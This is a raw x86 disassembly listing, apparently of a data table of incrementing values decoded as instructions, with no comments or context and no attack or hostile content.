add byte [ebx + esi], al
add byte [eax], al
test dword [ebx], esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
xchg byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
xchg dword [ebx], esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dword [ebx], esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dh, byte [ebx]
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov esi, dword [ebx]
add byte [eax], al
add byte [eax], al
add byte [eax], al
invalid
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x33], cl
add byte [eax], al
add byte [esi + 0x33], cl
add byte [eax], al
add byte [edi + 0x33], cl
add byte [eax], al
add byte [eax + 0x33], dl
add byte [eax], al
add byte [ecx + 0x33], dl
add byte [eax], al
add byte [edx + 0x33], dl
add byte [eax], al
add byte [ebx + 0x33], dl
add byte [eax], al
add byte [ebx + esi], dl
add byte [eax], al
xchg ebp, eax
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + 0x33], dl
add byte [eax], al
add byte [edi + 0x33], dl
add byte [eax], al
add byte [eax + 0x33], bl
add byte [eax], al
add byte [ecx + 0x33], bl
add byte [eax], al
add byte [edx + 0x33], bl
add byte [eax], al
add byte [ebx + 0x33], bl
add byte [eax], al
add byte [ebx + esi], bl
add byte [eax], al
popfd
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + 0x33], bl
add byte [eax], al
add byte [edi + 0x33], bl
add byte [eax], al
add byte [eax + 0x33], ah
add byte [eax], al
add byte [ecx + 0x33], ah
add byte [eax], al
add byte [edx + 0x33], ah
add byte [eax], al
add byte [ebx + 0x33], ah
add byte [eax], al
add byte [ebx + esi], ah
add byte [eax], al
movsd dword es:[edi], dword ptr [esi]
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + 0x33], ah
add byte [eax], al
add byte [edi + 0x33], ah
add byte [eax], al
add byte [eax + 0x33], ch
add byte [eax], al
add byte [ecx + 0x33], ch
add byte [eax], al
add byte [edx + 0x33], ch
add byte [eax], al
add byte [ebx + 0x33], ch
add byte [eax], al
add byte [ebx + esi], ch
add byte [eax], al
lodsd eax, dword [esi]
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + 0x33], ch
add byte [eax], al
add byte [edi + 0x33], ch
add byte [eax], al
add byte [eax + 0x33], dh
add byte [eax], al
add byte [ecx + 0x33], dh
add byte [eax], al
add byte [edx + 0x33], dh
add byte [eax], al
add byte [ebx + 0x33], dh
add byte [eax], al
add byte [ebx + esi], dh
add byte [eax], al
mov ch, 0x33
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dh, 0x33
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov bh, 0x33
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov eax, 0x33
add byte [eax], al
add byte [ecx + 0x33], bh
add byte [eax], al
add byte [edx + 0x33], bh
add byte [eax], al
add byte [ebx + 0x33], bh
add byte [eax], al
add byte [ebx + esi], bh
add byte [eax], al
mov ebp, 0x33
add byte [eax], al
add byte [esi + 0x33], bh
add byte [eax], al
add byte [edi + 0x33], bh
add byte [eax], al
add dl, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bl, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ah, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ch, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dh, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bh, al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add al, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add cl, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dl, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bl, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ah, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ch, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dh, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bh, cl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add al, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add cl, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dl, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bl, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ah, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ch, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dh, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bh, dl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add al, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add cl, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add dl, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add bl, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ah, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add ch, bl
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
sti
add byte [eax], al
add byte [eax], al
add byte [eax], al
add ebx, edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add bh, bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add edi, ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add al, 0xfb
add byte [eax], al
add byte [eax], al
add byte [eax], al
push es
sti
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub ebx, edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add dh, bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add esi, edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add bh, dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add edi, esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add al, 0xfe
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, 0xfe
add byte [eax], al
add byte [esi], al
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], al
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + edi*8], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
or eax, 0xfe
add byte [eax], al
add byte [esi], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], cl
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 2], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi - 2], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edx - 2], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 2], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi - 2], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop ecx
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edx - 2], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop ebx
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [esi + edi*8], bl
add byte [eax], al
add byte [eax], al
add byte [edi - 2], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx - 2], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
invalid
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx - 2], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc byte fs:[eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 2], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax - 2], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul edi, esi, 0
add byte [eax], al
push 0xfffffffffffffffe
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul edi, esi, 0
add byte [eax], al
add byte [eax], al
add bh, bh
inc byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], al
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], al
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], al
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, 0xff
add byte [eax], al
add byte [esi], al
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], al
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
or eax, 0xff
add byte [eax], al
add byte [esi], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], cl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc eax, 0xff
add byte [eax], al
add byte [esi], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], dl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
sbb eax, 0xff
add byte [eax], al
add byte [esi], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], bl
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, 0xff
add byte [eax], al
add byte [esi], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], ah
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0xff
add byte [eax], al
add byte [esi], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], ch
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0xff
add byte [eax], al
add byte [esi], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], dh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp eax, 0xff
add byte [eax], al
add byte [esi], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], bh
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax - 1], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edx - 1], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + edi*8], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 1], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi - 1], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx - 1], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx - 1], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 1], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi - 1], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx - 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx - 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [edi - 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx - 1], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx - 1], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esp
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp - 1], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esi
inc dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add eax, 0x1d4
add byte [eax], al
add byte [esi], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or eax, 0x1d4
add byte [eax], al
add byte [esi], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], cl
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc eax, 0x1d4
add byte [eax], al
add byte [esi], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], dl
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb eax, 0x1d4
add byte [eax], al
add byte [esi], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], bl
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and eax, 0x1d4
add byte [eax], al
add byte [esi], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], ah
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub eax, 0x1d4
add byte [eax], al
add byte [esi], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], ch
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor eax, 0x1d4
add byte [eax], al
add byte [esi], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], dh
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8], bh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp eax, 0x1d4
add byte [eax], al
add byte [esi], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi], bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax - 0x2c], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ecx
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx - 0x2c], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ebx
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8 + 1], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2c], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc esi
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2c], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec eax
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx - 0x2c], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec edx
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2c], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esp
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2c], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esi
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2c], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push eax
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx - 0x2c], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push edx
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2c], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push esp
aam 1
add byte [eax], al
add byte [eax], al
add byte [esi - 0x2c], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push edi
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax - 0x2c], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ecx
aam 1
add byte [eax], al
add byte [eax], al
add byte [edx - 0x2c], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ebx
aam 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8 + 1], bl
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2c], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop esi
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2c], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pushal
aam 1
add byte [eax], al
add byte [eax], al
add byte [ecx - 0x2c], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2c], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2c], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2c], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0x1d4
add byte [eax], al
add byte [ecx - 0x2c], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0xffffffffffffffd4
add dword [eax], eax
add byte [eax], al
add byte [eax], al
imul edx, esp, 1
add byte [eax], al
add byte [eax], al
add byte [esp + edx*8 + 1], ch
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2c], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2c], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jo 0x80972e6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jno 0x80972ee
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jb 0x80972f6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jae 0x80972fe
add dword [eax], eax
add byte [eax], al
add byte [eax], al
je 0x8097306
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jne 0x809730e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jbe 0x8097316
add dword [eax], eax
add byte [eax], al
add byte [eax], al
ja 0x809731e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
js 0x8097326
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jns 0x809732e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jp 0x8097336
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jnp 0x809733e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jl 0x8097346
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jge 0x809734e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jle 0x8097356
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jg 0x809735e
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc ah, 1
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x1d4], al
add byte [eax], al
add byte [edx + 0x1d4], al
add byte [eax], al
add byte [ebx + 0x1d4], al
add byte [eax], al
add byte [esp + edx*8 + 1], al
add byte [eax], al
test esp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ah, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg esp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov ah, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov esp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dl, ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov edx, esp
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov esp, ss
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
aam 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d4], cl
add byte [eax], al
add byte [edi + 0x1d4], cl
add byte [eax], al
add byte [eax + 0x1d4], dl
add byte [eax], al
add byte [ecx + 0x1d4], dl
add byte [eax], al
add byte [edx + 0x1d4], dl
add byte [eax], al
add byte [ebx + 0x1d4], dl
add byte [eax], al
add byte [esp + edx*8 + 1], dl
add byte [eax], al
xchg ebp, eax
aam 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d4], dl
add byte [eax], al
add byte [edi + 0x1d4], dl
add byte [eax], al
add byte [eax + 0x1d4], bl
add byte [eax], al
add byte [ecx + 0x1d4], bl
add byte [eax], al
add byte [edx + 0x1d4], bl
add byte [eax], al
add byte [ebx + 0x1d4], bl
add byte [eax], al
add byte [esp + edx*8 + 1], bl
add byte [eax], al
sahf
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi + 0x1d4], bl
add byte [eax], al
add byte [edx + 0x1d4], ah
add byte [eax], al
add byte [ebp + 0x1d4], ah
add byte [eax], al
add byte [esi + 0x1d4], ah
add byte [eax], al
add byte [ecx + 0x1d4], ch
add byte [eax], al
add byte [edx + 0x1d4], ch
add byte [eax], al
add byte [ebx + 0x1d4], ch
add byte [eax], al
add byte [esp + edx*8 + 1], ch
add byte [eax], al
scasb al, byte es:[edi]
aam 1
add byte [eax], al
add byte [eax], al
add byte [edi + 0x1d4], ch
add byte [eax], al
add byte [eax + 0x1d4], dh
add byte [eax], al
add byte [ecx + 0x1d4], dh
add byte [eax], al
add byte [edx + 0x1d4], dh
add byte [eax], al
add byte [ebx + 0x1d4], dh
add byte [eax], al
add byte [esp + edx*8 + 1], dh
add byte [eax], al
mov ch, 0xd4
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dh, 0xd4
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov bh, 0xd4
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov eax, 0x1d4
add byte [eax], al
add byte [ecx + 0x1d4], bh
add byte [eax], al
add byte [ebx + 0x1d4], bh
add byte [eax], al
add byte [ebp + 0x1d4], bh
add byte [eax], al
add byte [esi + 0x1d4], bh
add byte [eax], al
add byte [edi + 0x1d4], bh
add byte [eax], al
add al, al
aam 1
add byte [eax], al
add byte [eax], al
add dl, al
aam 1
add byte [eax], al
add byte [eax], al
add bl, al
aam 1
add byte [eax], al
add byte [eax], al
add ch, al
aam 1
add byte [eax], al
add byte [eax], al
add dh, al
aam 1
add byte [eax], al
add byte [eax], al
add bh, al
aam 1
add byte [eax], al
add byte [eax], al
add al, cl
aam 1
add byte [eax], al
add byte [eax], al
add cl, cl
aam 1
add byte [eax], al
add byte [eax], al
add dl, cl
aam 1
add byte [eax], al
add byte [eax], al
add bl, cl
aam 1
add byte [eax], al
add byte [eax], al
add ah, cl
aam 1
add byte [eax], al
add byte [eax], al
add ch, cl
aam 1
add byte [eax], al
add byte [eax], al
add dh, cl
aam 1
add byte [eax], al
add byte [eax], al
add bh, cl
aam 1
add byte [eax], al
add byte [eax], al
add al, dl
aam 1
add byte [eax], al
add byte [eax], al
add cl, dl
aam 1
add byte [eax], al
add byte [eax], al
add dl, dl
aam 1
add byte [eax], al
add byte [eax], al
add bl, dl
aam 1
add byte [eax], al
add byte [eax], al
add ah, dl
aam 1
add byte [eax], al
add byte [eax], al
add ch, dl
aam 1
add byte [eax], al
add byte [eax], al
add dh, dl
aam 1
add byte [eax], al
add byte [eax], al
add bh, dl
aam 1
add byte [eax], al
add byte [eax], al
add al, bl
aam 1
add byte [eax], al
add byte [eax], al
add cl, bl
aam 1
add byte [eax], al
add byte [eax], al
add dl, bl
aam 1
add byte [eax], al
add byte [eax], al
add bl, bl
aam 1
add byte [eax], al
add byte [eax], al
add ah, bl
aam 1
add byte [eax], al
add byte [eax], al
add ch, bl
aam 1
add byte [eax], al
add byte [eax], al
add dh, bl
aam 1
add byte [eax], al
add byte [eax], al
add bh, bl
aam 1
add byte [eax], al
add byte [eax], al
add al, ah
aam 1
add byte [eax], al
add byte [eax], al
add cl, ah
aam 1
add byte [eax], al
add byte [eax], al
add dl, ah
aam 1
add byte [eax], al
add byte [eax], al
add bl, ah
aam 1
add byte [eax], al
add byte [eax], al
add ah, ah
aam 1
add byte [eax], al
add byte [eax], al
add ch, ah
aam 1
add byte [eax], al
add byte [eax], al
add dh, ah
aam 1
add byte [eax], al
add byte [eax], al
add bh, ah
aam 1
add byte [eax], al
add byte [eax], al
add al, ch
aam 1
add byte [eax], al
add byte [eax], al
add cl, ch
aam 1
add byte [eax], al
add byte [eax], al
add dl, ch
aam 1
add byte [eax], al
add byte [eax], al
add bl, ch
aam 1
add byte [eax], al
add byte [eax], al
add ah, ch
aam 1
add byte [eax], al
add byte [eax], al
add ch, ch
